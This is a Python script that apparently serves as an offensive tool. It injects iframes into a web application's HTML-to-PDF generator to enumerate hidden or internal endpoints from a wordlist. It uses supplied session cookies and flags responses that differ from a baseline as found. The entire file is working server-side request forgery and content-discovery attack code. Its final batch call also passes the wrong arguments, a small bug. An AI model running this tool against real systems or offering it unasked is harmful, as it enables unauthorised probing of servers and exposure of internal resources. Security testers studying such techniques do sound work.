from typing import List
import requests
import time
import os
from pypdf import PdfReader
import re
import json

class Config:
    def __init__(self, target: str, pdf_gen_path: str, endpoints_per_request: int, baseline_len_threshold: int, use_regex: bool, regex_not_found: str) -> None:
        self.target = target
        self.pdf_gen_path = pdf_gen_path
        self.endpoints_per_request = endpoints_per_request
        self.baseline_len_threshold = baseline_len_threshold
        self.use_regex = use_regex
        self.regex_not_found = re.compile(regex_not_found)

cookies = {}

def main():
    output_dir = "pdfs"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    with open('config.json','r') as cfg:
        config_json = json.loads(cfg.read())
        config = Config(config_json["TARGET"],config_json["PDF_GEN_PATH"],config_json["ENDPOINTS_PER_REQUEST"],config_json["BASELINE_LEN_THRESHOLD"],config_json["USE_REGEX"],config_json["REGEX_NOT_FOUND"])
    with open('wordlist.txt','r') as f:
        lines = f.readlines()
    with open('cookies.txt','r') as c:
        fill_cookies(c.read())
    lines_cache = []
    baseline_len = perform_baseline_request(config)
    for i in range(len(lines)):
        lines_cache.append(lines[i])
        if len(lines_cache) % config.endpoints_per_request == 0:
            get_pdf_for_lines(lines_cache, baseline_len, config)
            lines_cache.clear()
    if len(lines_cache) > 0:
        get_pdf_for_lines(lines_cache, config)
        lines_cache.clear()

def get_pdf_for_lines(lines: List[str], baseline_len: int, config: Config):
    iframes_string = create_iframes_string(lines, config)
    res = requests.post(f"{config.target}{config.pdf_gen_path}", data=f"{iframes_string}", cookies=cookies, headers={"Content-Type": "application/x-www-form-urlencoded"})
    write_pdf(res.content, baseline_len, config)


def perform_baseline_request(config: Config):
    lines = []
    for _ in range(config.endpoints_per_request):
        lines.append("doesnotexist")
    iframes_string = create_iframes_string(lines, config)
    res = requests.post(f"{config.target}{config.pdf_gen_path}", data=f"{iframes_string}", cookies=cookies, headers={"Content-Type": "application/x-www-form-urlencoded"})
    return len(res.content)

def create_iframes_string(lines: List[str], config):
    result = ""
    for l in lines:
        result += f"<p>{l}</p><iframe+width=\"500\"+height=\"500\"+src=\"{config.target}/{l}\"></iframe>"
    return result

def write_pdf(content: bytes, baseline_len: int, config: Config):
    suffix = ".pdf"
    filename = f"{str(time.time()).replace('.','')}"
    fullpath =  f'pdfs/{filename}{suffix}'
    with open(fullpath,'wb') as output:
        output.write(content)
    reader = PdfReader(fullpath)
    text = ""
    for page in reader.pages:
        text += page.extract_text() + "\n"
    matches = re.findall(config.regex_not_found, text)
    if config.use_regex and len(matches) != config.endpoints_per_request:
        os.rename(fullpath, fullpath.replace(".pdf","") + "-FOUND.pdf")
    elif not config.use_regex and abs(len(content)-baseline_len) > config.baseline_len_threshold:
        os.rename(fullpath, fullpath.replace(".pdf","") + "-FOUND.pdf")
        
def fill_cookies(c: str):
    splitted = c.split(";")
    for s in splitted:
        if "=" in s:
            _s = s.split("=")
            cookies[_s[0]] = _s[1]

if __name__ == '__main__':
    main()